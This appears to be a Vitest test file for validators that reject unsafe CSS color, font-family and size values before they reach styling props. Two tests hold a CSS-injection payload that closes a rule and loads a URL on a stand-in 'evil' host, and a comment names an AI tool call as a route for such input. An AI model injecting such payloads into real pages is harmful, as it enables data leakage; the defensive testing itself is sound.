import { describe, expect, it } from 'vitest';
import {
  isSafeCssColor,
  sanitizeCssColor,
  isSafeFontFamily,
  sanitizeFontSize,
  sanitizeFiniteNumber,
} from './cssValueValidation';

// Finding 1: these validators are the render-time boundary that stops a doc-authored CSS
// string (reachable via `loadSerializedState`/the AI `update_widget` tool call) from
// injecting arbitrary CSS rules when interpolated into an Emotion `sx` prop.
describe('cssValueValidation (finding 1)', () => {
  describe('isSafeCssColor / sanitizeCssColor', () => {
    it('accepts common valid color syntaxes', () => {
      expect(isSafeCssColor('#fff')).toBe(true);
      expect(isSafeCssColor('#ff8800')).toBe(true);
      expect(isSafeCssColor('#ff8800cc')).toBe(true);
      expect(isSafeCssColor('red')).toBe(true);
      expect(isSafeCssColor('cornflowerblue')).toBe(true);
      expect(isSafeCssColor('rgb(255, 0, 0)')).toBe(true);
      expect(isSafeCssColor('rgba(255, 0, 0, 0.5)')).toBe(true);
      expect(isSafeCssColor('hsl(200, 50%, 50%)')).toBe(true);
    });

    it('rejects a CSS-injecting string', () => {
      const payload = 'red;} .MuiCard-root{background:url(https://evil/leak)';
      expect(isSafeCssColor(payload)).toBe(false);
      expect(sanitizeCssColor(payload)).toBeUndefined();
      expect(sanitizeCssColor(payload, 'text.primary')).toBe('text.primary');
    });

    it('rejects non-string / empty values', () => {
      expect(isSafeCssColor(undefined)).toBe(false);
      expect(isSafeCssColor(null)).toBe(false);
      expect(isSafeCssColor(42)).toBe(false);
      expect(isSafeCssColor('   ')).toBe(false);
      expect(isSafeCssColor('')).toBe(false);
    });

    it('sanitizeCssColor returns the value unchanged when valid', () => {
      expect(sanitizeCssColor('#123456')).toBe('#123456');
    });
  });

  describe('isSafeFontFamily', () => {
    it('accepts a normal comma-separated font stack', () => {
      expect(isSafeFontFamily('Fraunces, "Inter Tight", serif')).toBe(true);
      expect(isSafeFontFamily("'Courier New', Courier, monospace")).toBe(true);
    });

    it('rejects a CSS-injecting string', () => {
      const payload = 'serif;} .MuiCard-root{background:url(https://evil/leak)';
      expect(isSafeFontFamily(payload)).toBe(false);
    });

    it('rejects non-string / empty values', () => {
      expect(isSafeFontFamily(undefined)).toBe(false);
      expect(isSafeFontFamily('')).toBe(false);
      expect(isSafeFontFamily('   ')).toBe(false);
    });
  });

  describe('sanitizeFontSize / sanitizeFiniteNumber', () => {
    it('accepts a positive finite number', () => {
      expect(sanitizeFontSize(16)).toBe(16);
      expect(sanitizeFiniteNumber(0)).toBe(0);
      expect(sanitizeFiniteNumber(-1, -5)).toBe(-1);
    });

    it('rejects non-numeric, non-finite, zero/negative (for font size), and below-min values', () => {
      expect(sanitizeFontSize('16px' as unknown as number)).toBeUndefined();
      expect(sanitizeFontSize(Number.NaN)).toBeUndefined();
      expect(sanitizeFontSize(Number.POSITIVE_INFINITY)).toBeUndefined();
      expect(sanitizeFontSize(0)).toBeUndefined();
      expect(sanitizeFontSize(-4)).toBeUndefined();
      expect(sanitizeFiniteNumber(-1)).toBeUndefined();
      expect(sanitizeFiniteNumber(undefined)).toBeUndefined();
    });
  });
});
